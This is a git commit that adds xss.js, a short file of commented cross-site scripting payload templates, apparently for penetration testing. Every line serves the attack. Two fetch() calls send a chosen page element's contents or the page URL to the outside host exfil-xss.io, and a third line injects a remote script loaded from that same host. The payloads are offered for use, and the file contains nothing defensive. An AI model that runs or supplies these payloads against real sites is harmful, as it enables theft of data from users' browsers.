ff190b90874bd71d6a9db180961da6fe096f86d8
im4x5yn74x <thesheepabides@gmail.com>
2020-04-01 18:40:04 -0400

    Add xss.js
    Initial Commit

---
+++ xss.js
@@ -0,0 +1,7 @@
+//XSS JavaScript Template
+//Use the following line as a template to capture HTML elements by ID value:
+//fetch(`https://exfil-xss.io/y?z=${document.getElementById("ELEMENT-ID").innerHTML}`)
+//When testing client-side exection, execute the following line within your Browser's Developer Console
+//var script = document.createElement("script");script.src="https://exfil-xss.io/x.js";document.body.appendChild(script);
+//Use the Fetch function to perform all types of data exfiltration. Concider the payload will reachout to your Exfil-XSS server and log everything givin to the "z" parameter.
+//fetch(`https://exfil-xss.io/y?z=${document.URL}`, {mode: "no-cors"})
